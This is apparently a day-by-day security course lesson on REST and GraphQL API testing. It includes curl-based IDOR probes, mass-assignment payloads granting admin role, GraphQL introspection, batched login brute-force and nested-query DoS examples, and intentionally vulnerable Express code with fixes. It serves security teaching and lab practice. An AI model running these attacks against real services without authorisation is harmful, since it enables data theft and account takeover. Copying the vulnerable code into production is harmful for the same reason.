---
title: "REST APIs, JSON, and GraphQL"
tags: [foundation, web, REST, API, JSON, GraphQL, introspection,
       mass-assignment, IDOR, attacker-mindset, API-security]
module: 01-Foundation-03
day: 20
related_topics:
  - Same-Origin Policy and CORS (Day 019)
  - API Security — OWASP API Top 10 (Day 119)
  - GraphQL Introspection (Day 120)
  - IDOR and Broken Access Control (Day 045)
---

# Day 020 — REST APIs, JSON, and GraphQL

## Goals

By the end of this lesson you will be able to:

1. Explain REST constraints and how real APIs deviate from the ideal.
2. Identify REST API security issues directly from the URL structure and
   HTTP method usage.
3. Enumerate a REST API's full endpoint set manually and with tools.
4. Send a GraphQL introspection query and map the full schema.
5. Identify at least four GraphQL-specific attack patterns.
6. Explain mass assignment and demonstrate it against a vulnerable endpoint.

---

## Prerequisites

- [Day 017 — Web Architecture Full Stack](DAY-0017-Web-Architecture-Full-Stack.md)
- [Day 019 — Same-Origin Policy and CORS](DAY-0019-Same-Origin-Policy-and-CORS.md)

---

## Main Content — Part 1: REST APIs

### 1. REST from an Attacker's Perspective

REST (Representational State Transfer) is a design style, not a standard.
Most "REST" APIs follow a loose interpretation. The security implications:

**Predictable resource URLs:**

```
GET  /api/v1/users/1234         → User 1234's profile
GET  /api/v1/users/1235         → User 1235's profile  ← IDOR candidate
PUT  /api/v1/users/1234         → Update user 1234
DELETE /api/v1/users/1234       → Delete user 1234
GET  /api/v1/users/1234/orders  → All orders for user 1234
GET  /api/v1/orders/9876        → Order 9876 details
```

If you can see your own ID in a response, try incrementing/decrementing it.
If the server returns someone else's data without checking authorisation —
that is an IDOR (Insecure Direct Object Reference), the most common bug
bounty finding.

**REST method misuse:**

Some APIs accept unexpected methods and process them differently:
```bash
# Server says POST only, but does it handle PUT differently?
curl -X PUT https://api.target.com/v1/users/1234 -d '{"role":"admin"}'

# Does HEAD return different headers than GET?
curl -I https://api.target.com/v1/admin/config

# Does OPTIONS reveal allowed methods?
curl -X OPTIONS https://api.target.com/v1/users/1234 -i
```

---

### 2. REST API Enumeration

**From JavaScript source:**

```bash
# Download main JS bundle and mine endpoints
JS_URL=$(curl -s https://target.com/ | grep -oE \
    'src="(/static/js/[^"]+)"' | head -1 | cut -d'"' -f2)
curl -s "https://target.com${JS_URL}" | \
    grep -oE '(["'"'"'])/?(api|v[0-9])[/a-zA-Z0-9_-]+' | \
    sort -u
```

**From Burp spider / history:**
All requests the browser makes appear in Burp's HTTP history. Sort by
path — look for `/api/`, `/v1/`, `/internal/` patterns.

**Active endpoint fuzzing (covered more in Day 065):**

```bash
ffuf -u https://target.com/api/v1/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200,201,204,401,403 -o api-endpoints.json
```

---

### 3. Mass Assignment — Trusting Client-Supplied Fields

**What it is:** The server accepts a JSON body and maps fields directly
to a data model object without filtering. If the model has fields the
client shouldn't control (e.g. `role`, `isAdmin`, `balance`), the client
can set them.

**Vulnerable Node.js example:**

```javascript
// Vulnerable: User.create() maps ALL body fields to the User model
app.post('/api/users', async (req, res) => {
    const user = await User.create(req.body);
    res.json(user);
});

// User model has: { name, email, password, role, isVerified, balance }
```

**Attack:**

```bash
# Normal registration body:
curl -X POST https://api.target.com/api/users \
    -H "Content-Type: application/json" \
    -d '{"name":"Ghost","email":"ghost@lab.com","password":"secret"}'

# Mass assignment attack — add role:admin to the body:
curl -X POST https://api.target.com/api/users \
    -H "Content-Type: application/json" \
    -d '{"name":"Ghost","email":"ghost@lab.com","password":"secret",
         "role":"admin","isVerified":true,"balance":99999}'
```

**Fix — explicit allowlist:**

```javascript
// Safe: only pick allowed fields from the body
const { name, email, password } = req.body;
const user = await User.create({ name, email, password });
```

---

## Main Content — Part 2: GraphQL

### 4. GraphQL Fundamentals

GraphQL is a query language for APIs. Instead of many REST endpoints, it
exposes a single endpoint (`/graphql`) where clients send queries describing
exactly what data they want.

**Key concepts:**
- **Query** — read data (equivalent to GET).
- **Mutation** — write data (equivalent to POST/PUT/DELETE).
- **Subscription** — real-time updates over WebSocket.
- **Schema** — the type system defining all available data.
- **Introspection** — a built-in mechanism to query the schema itself.

**Sample query:**

```graphql
query {
  user(id: "1234") {
    id
    email
    orders {
      total
      items {
        name
        price
      }
    }
  }
}
```

**Sent as HTTP:**

```bash
curl -X POST https://api.target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(id:\"1234\") { id email orders { total } } }"}'
```

---

### 5. GraphQL Introspection — Schema Mapping

**Introspection query** — gets the entire schema in one request:

```bash
curl -X POST https://api.target.com/graphql \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -d '{
       "query": "__schema { queryType { name } mutationType { name }
         types { name kind fields { name type { name kind } } } }"
     }'
```

**Shorter version — just type names:**

```bash
curl -X POST https://api.target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name kind fields{name}}}}"}'
```

**Using graphql-voyager or InQL (Burp extension)** to visualise the schema:
Both tools take the introspection JSON output and produce a relationship
diagram — easier to find sensitive types and mutations.

**What to look for in the schema:**
- `Admin` types or mutations with admin-level operations.
- `User` mutations that accept fields like `role`, `isAdmin`.
- Hidden fields not visible in the UI (the schema shows everything).
- `deleteUser`, `updatePassword`, `transferFunds` mutations.

---

### 6. GraphQL Attack Patterns

#### Attack 1 — Introspection Enabled in Production

If introspection returns data, the schema is public. Map it completely.
Many developers leave introspection on because their documentation depends
on it — and forget that attackers can use it too.

```bash
# Quick check: is introspection enabled?
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__typename}"}' | grep -i "__typename"
# Response: {"data":{"__typename":"Query"}} → enabled
```

#### Attack 2 — IDOR via GraphQL Arguments

```graphql
# Fetch YOUR data:
query { user(id: "my-id") { email balance creditCards { number } } }

# Change the ID — same as REST IDOR:
query { user(id: "other-users-id") { email balance creditCards { number } } }
```

#### Attack 3 — Batching Attack (Rate Limit Bypass)

GraphQL allows sending multiple operations in one request. This can bypass
per-request rate limiting:

```json
[
  {"query": "mutation { login(email:\"admin@corp\", password:\"password1\") { token } }"},
  {"query": "mutation { login(email:\"admin@corp\", password:\"password2\") { token } }"},
  {"query": "mutation { login(email:\"admin@corp\", password:\"password3\") { token } }"}
]
```

One HTTP request, 100+ login attempts → rate limiter sees one request.

#### Attack 4 — Deeply Nested Query (DoS)

```graphql
{
  user {
    friends {
      friends {
        friends {
          friends {
            friends { id email }
          }
        }
      }
    }
  }
}
```

Without query depth limiting, this can trigger exponential DB queries.

#### Attack 5 — Field Suggestion / Alias Confusion

GraphQL suggests similar field names when you mistype. This reveals fields
that aren't in the docs but exist in the schema:

```graphql
query { user { passwrd } }
# Error: "Did you mean 'password'?"  ← field confirmed to exist
```

---

## Key Takeaways

1. **Predictable REST resource IDs are IDOR candidates.** Always test with
   another user's session — or with no session at all. The fix is
   authorisation checks, not obscure IDs.
2. **Mass assignment is trivially exploitable in any framework that
   auto-maps request body to models.** Look for registration, update
   profile, and checkout endpoints.
3. **GraphQL introspection gives you the entire schema for free.** On any
   target running GraphQL, run the introspection query first. It is faster
   than any spider or fuzzer.
4. **GraphQL batching bypasses rate limiters.** Send 1000 login mutations
   in a single HTTP request. Per-operation limits are required, not
   per-request.
5. **REST and GraphQL are different interfaces, same underlying logic.**
   The IDOR in REST and the IDOR in GraphQL have the same root cause:
   missing authorisation check on the data access.

---

## Exercises

### Exercise 1 — REST IDOR

Set up Juice Shop (`docker run -p 3000:3000 bkimminich/juice-shop`) and:

1. Register an account. Note your user ID from the profile API.
2. Try accessing another user's profile by changing the ID.
3. Try accessing `/api/Users/1` without authentication.
4. Write a one-sentence finding: "The `/api/Users/:id` endpoint does not
   verify that the authenticated user owns the requested resource, allowing
   any authenticated user to read any other user's profile data."

### Exercise 2 — GraphQL Introspection

1. Install a GraphQL lab (`docker run -p 4000:4000 graphql/swapi-graphql`)
   or use the Juice Shop GraphQL endpoint.
2. Send the full introspection query.
3. List all available queries, mutations, and types.
4. Find any mutation that looks security-sensitive.
5. Try calling it — does it require authentication?

### Exercise 3 — Mass Assignment

Write a vulnerable Express + Mongoose endpoint and exploit it:

```javascript
// User schema includes: name, email, password, role (default: 'user')
app.post('/register', async (req, res) => {
    const user = new User(req.body);  // vulnerable: maps all body fields
    await user.save();
    res.json({ id: user._id, role: user.role });
});
```

Register with `{"name":"test","email":"t@t.com","password":"x","role":"admin"}`.
Confirm `role: "admin"` in the response. Then fix it.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 019 — Same-Origin Policy and CORS](DAY-0019-Same-Origin-Policy-and-CORS.md)*
*Next: [Day 021 — WebSockets and Client-Side Storage](DAY-0021-WebSockets-and-Client-Side-Storage.md)*
